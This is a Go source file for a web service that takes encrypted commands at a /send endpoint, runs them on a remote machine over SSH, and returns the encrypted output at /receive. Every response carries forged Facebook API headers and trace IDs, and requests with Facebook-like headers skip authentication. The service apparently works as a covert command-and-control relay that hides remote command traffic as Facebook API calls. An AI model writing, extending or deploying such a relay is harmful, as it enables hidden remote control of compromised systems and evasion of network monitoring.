package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "log"
    "math/big"
    "net/http"
    "os"
    "sync"
    "time"

    "golang.org/x/crypto/ssh"
)

// Buffer manages encrypted session data between /send and /receive
type Buffer struct {
    data map[string][]message
    mu   sync.RWMutex
}

type message struct {
    data      []byte
    timestamp time.Time
}

func NewBuffer() *Buffer {
    return &Buffer{
        data: make(map[string][]message),
    }
}

func (b *Buffer) Add(token string, data []byte) {
    b.mu.Lock()
    defer b.mu.Unlock()
    b.data[token] = append(b.data[token], message{data: data, timestamp: time.Now()})
    if len(b.data[token]) > 100 {
        b.data[token] = b.data[token][1:]
    }
}

func (b *Buffer) Pop(token string) ([]byte, bool) {
    b.mu.Lock()
    defer b.mu.Unlock()
    now := time.Now()
    valid := []message{}
    for _, msg := range b.data[token] {
        if now.Sub(msg.timestamp) < 30*time.Second {
            valid = append(valid, msg)
        }
    }
    b.data[token] = valid
    if len(b.data[token]) == 0 {
        return nil, false
    }
    data := b.data[token][0].data
    b.data[token] = b.data[token][1:]
    return data, true
}

func (b *Buffer) StartCleanupTask() {
    go func() {
        for {
            time.Sleep(60 * time.Second)
            b.cleanup()
        }
    }()
}

func (b *Buffer) cleanup() {
    b.mu.Lock()
    defer b.mu.Unlock()
    now := time.Now()
    for token, messages := range b.data {
        valid := []message{}
        for _, msg := range messages {
            if now.Sub(msg.timestamp) < 5*time.Minute {
                valid = append(valid, msg)
            }
        }
        if len(valid) == 0 {
            delete(b.data, token)
        } else {
            b.data[token] = valid
        }
    }
}

// AES Encryption Setup
var (
    buffer     = NewBuffer()
    encryptKey = []byte("1234567890abcdef") // Hardcoded fallback (dev only!)
    authSecret = "super_secret_auth"        // Auth secret (dev only!)
    sshClient  *ssh.Client                 // Global SSH client
)

// Facebook-like Random String Generators
func generateFacebookDebugID() string {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    result := make([]byte, 16)
    for i := range result {
        n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
        result[i] = chars[n.Int64()]
    }
    return string(result)
}

func generateFacebookTraceID() string {
    n, _ := rand.Int(rand.Reader, big.NewInt(9000000000000000))
    return fmt.Sprintf("%d", n.Int64()+1000000000000000)
}

func generateRandomCluster() string {
    clusters := []string{"c1", "c2", "c3", "ash", "prn", "dfw"}
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(clusters))))
    return clusters[n.Int64()]
}

// AES Encrypt
func encrypt(data []byte) ([]byte, error) {
    block, err := aes.NewCipher(encryptKey)
    if err != nil {
        return nil, err
    }
    ciphertext := make([]byte, aes.BlockSize+len(data))
    iv := ciphertext[:aes.BlockSize]
    if _, err := io.ReadFull(rand.Reader, iv); err != nil {
        return nil, err
    }
    stream := cipher.NewCTR(block, iv)
    stream.XORKeyStream(ciphertext[aes.BlockSize:], data)
    return ciphertext, nil
}

// AES Decrypt
func decrypt(ciphertext []byte) ([]byte, error) {
    block, err := aes.NewCipher(encryptKey)
    if err != nil {
        return nil, err
    }
    if len(ciphertext) < aes.BlockSize {
        return nil, fmt.Errorf("ciphertext too short")
    }
    iv := ciphertext[:aes.BlockSize]
    data := ciphertext[aes.BlockSize:]
    stream := cipher.NewCTR(block, iv)
    stream.XORKeyStream(data, data)
    return data, nil
}

// Add Facebook Response Headers
func addFacebookHeaders(w http.ResponseWriter) {
    w.Header().Set("Content-Type", "application/json; charset=UTF-8")
    w.Header().Set("X-FB-Debug", generateFacebookDebugID())
    w.Header().Set("X-FB-Trace-ID", generateFacebookTraceID())
    w.Header().Set("Facebook-API-Version", "v15.0")
    w.Header().Set("Pragma", "no-cache")
    w.Header().Set("Cache-Control", "private, no-cache, no-store, must-revalidate")
    w.Header().Set("Expires", "Sat, 01 Jan 2000 00:00:00 GMT")
    w.Header().Set("Vary", "Accept-Encoding")
    w.Header().Set("Strict-Transport-Security", "max-age=15552000; preload")
}

// Initialize SSH Connection
func connectToSSH() error {
    config := &ssh.ClientConfig{
        User: os.Getenv("SSH_USER"),
        Auth: []ssh.AuthMethod{
            ssh.Password(os.Getenv("SSH_PASSWORD")),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(), // For testing only!
        Timeout:         10 * time.Second,
        Config: &ssh.Config{
            Compression: true, // Enable SSH compression
        },
    }

    client, err := ssh.Dial("tcp", os.Getenv("SSH_ADDR"), config)
    if err != nil {
        return err
    }
    sshClient = client
    log.Println("SSH connection established")
    return nil
}

// Background Reconnect Task
func startSSHBackgroundLoop() {
    go func() {
        for {
            if sshClient == nil {
                if err := connectToSSH(); err != nil {
                    log.Printf("SSH reconnect failed: %v", err)
                }
            }
            time.Sleep(10 * time.Second) // Reconnect interval
        }
    }()
}

// Handlers
func sendHandler(w http.ResponseWriter, r *http.Request) {
    userAgent := r.Header.Get("User-Agent")
    hasFacebookUA := false

    if userAgent != "" {
        hasFacebookUA = (len(userAgent) > 20 &&
            (r.Header.Get("X-FB-HTTP-Engine") != "" ||
                r.Header.Get("X-FB-Connection-Type") != ""))
    }

    token := r.Header.Get("X-Token")
    if token == "" {
        token = r.Header.Get("X-FB-Trace-ID")
    }
    if token == "" {
        token = generateFacebookTraceID()
    }

    authenticated := (r.Header.Get("X-Auth") == authSecret) || hasFacebookUA
    if !authenticated {
        addFacebookHeaders(w)
        http.Error(w, `{"error": "Authentication required"}`, http.StatusUnauthorized)
        return
    }

    var data []byte
    target := r.Header.Get("X-Target")
    if target != "" {
        encryptedData, err := base64.StdEncoding.DecodeString(target)
        if err != nil {
            addFacebookHeaders(w)
            http.Error(w, `{"error": "Invalid payload format"}`, http.StatusBadRequest)
            return
        }
        data, err = decrypt(encryptedData)
        if err != nil {
            addFacebookHeaders(w)
            http.Error(w, `{"error": "Payload processing failed"}`, http.StatusBadRequest)
            return
        }
    } else {
        maxSize := 1024 * 1024
        r.Body = http.MaxBytesReader(w, r.Body, int64(maxSize))
        encryptedData, err := io.ReadAll(r.Body)
        if err != nil || len(encryptedData) == 0 {
            addFacebookHeaders(w)
            http.Error(w, `{"error": "Failed to read request body"}`, http.StatusBadRequest)
            return
        }

        if len(encryptedData) > aes.BlockSize {
            data, err = decrypt(encryptedData)
            if err != nil {
                decoded, decErr := base64.StdEncoding.DecodeString(string(encryptedData))
                if decErr == nil && len(decoded) > aes.BlockSize {
                    data, err = decrypt(decoded)
                }
                if err != nil {
                    data = encryptedData
                }
            }
        } else {
            data = encryptedData
        }
    }

    // Execute over SSH if connected
    if sshClient == nil {
        if err := connectToSSH(); err != nil {
            log.Printf("SSH initialization failed: %v", err)
        }
    }

    if sshClient != nil {
        session, err := sshClient.NewSession()
        if err != nil {
            log.Printf("SSH session failed: %v", err)
        } else {
            defer session.Close()

            cmd := string(data)
            output, err := session.CombinedOutput(cmd)
            if err != nil {
                log.Printf("Remote command failed: %v", err)
                output = []byte(fmt.Sprintf("Error: %s\n%s", err, output))
            }
            buffer.Add(token, output)
        }
    } else {
        buffer.Add(token, []byte("SSH NOT CONNECTED:\n"+string(data)))
    }

    addFacebookHeaders(w)
    resp := map[string]interface{}{
        "status":    "success",
        "trace_id":  token,
        "server_time": time.Now().UnixMilli(),
    }
    json.NewEncoder(w).Encode(resp)
}

func receiveHandler(w http.ResponseWriter, r *http.Request) {
    userAgent := r.Header.Get("User-Agent")
    hasFacebookUA := false

    if userAgent != "" {
        hasFacebookUA = (len(userAgent) > 20 &&
            (r.Header.Get("X-FB-HTTP-Engine") != "" ||
                r.Header.Get("X-FB-Connection-Type") != ""))
    }

    token := r.Header.Get("X-Token")
    if token == "" {
        token = r.Header.Get("X-FB-Trace-ID")
    }
    if token == "" {
        addFacebookHeaders(w)
        http.Error(w, `{"error": "Missing token"}`, http.StatusBadRequest)
        return
    }

    authenticated := (r.Header.Get("X-Auth") == authSecret) || hasFacebookUA
    if !authenticated {
        addFacebookHeaders(w)
        http.Error(w, `{"error": "Authentication required"}`, http.StatusUnauthorized)
        return
    }

    for i := 0; i < 3; i++ {
        if data, ok := buffer.Pop(token); ok {
            encryptedData, err := encrypt(data)
            if err != nil {
                addFacebookHeaders(w)
                http.Error(w, `{"error": "Processing failure"}`, http.StatusInternalServerError)
                return
            }

            addFacebookHeaders(w)
            resp := map[string]interface{}{
                "data":       base64.StdEncoding.EncodeToString(encryptedData),
                "trace_id":   token,
                "server_time": time.Now().UnixMilli(),
            }
            json.NewEncoder(w).Encode(resp)
            return
        }
        time.Sleep(500 * time.Millisecond)
    }

    addFacebookHeaders(w)
    resp := map[string]interface{}{
        "status":    "no_data",
        "trace_id":  token,
        "server_time": time.Now().UnixMilli(),
    }
    w.WriteHeader(http.StatusOK)
    json.NewEncoder(w).Encode(resp)
}

func healthHandler(w http.ResponseWriter, r *http.Request) {
    if r.Header.Get("Accept") != "" && r.Header.Get("Accept") == "*/*" {
        w.Header().Set("Content-Type", "text/html; charset=UTF-8")
        fmt.Fprintf(w, `<!DOCTYPE html><html><body><h1>Service Status</h1></body></html>`)
        return
    }

    addFacebookHeaders(w)
    json.NewEncoder(w).Encode(map[string]interface{}{
        "status":      "online",
        "server_time": time.Now().UnixMilli(),
        "server_id":   generateRandomCluster(),
    })
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
    if r.URL.Path != "/" {
        addFacebookHeaders(w)
        w.WriteHeader(http.StatusNotFound)
        json.NewEncoder(w).Encode(map[string]interface{}{
            "error": map[string]interface{}{
                "message": "Endpoint not found",
                "type":    "APIException",
                "code":    404,
                "fbtrace_id": generateFacebookTraceID(),
            },
        })
        return
    }
    healthHandler(w, r)
}

func main() {
    buffer.StartCleanupTask()

    // Read key from environment or use dev fallback
    if envKey := os.Getenv("ENCRYPTION_KEY"); envKey != "" {
        envKeyBytes := []byte(envKey)
        if len(envKeyBytes) >= 16 {
            encryptKey = envKeyBytes[:16]
        }
    }

    // Read auth secret from environment
    if envAuth := os.Getenv("AUTH_SECRET"); envAuth != "" {
        authSecret = envAuth
    }

    // Start SSH background loop
    startSSHBackgroundLoop()

    // Set up routes
    mux := http.NewServeMux()
    mux.HandleFunc("/send", sendHandler)
    mux.HandleFunc("/receive", receiveHandler)
    mux.HandleFunc("/health", healthHandler)
    mux.HandleFunc("/", rootHandler)

    port := os.Getenv("PORT")
    if port == "" {
        port = "8080"
    }

    log.Printf("Starting proxy on :%s", port)
    server := &http.Server{
        Addr:              ":" + port,
        Handler:           mux,
        ReadTimeout:       10 * time.Second,
        WriteTimeout:      10 * time.Second,
        IdleTimeout:       60 * time.Second,
        ReadHeaderTimeout: 5 * time.Second,
    }

    if err := server.ListenAndServe(); err != nil {
        log.Fatalf("Server failed: %v", err)
    }
}
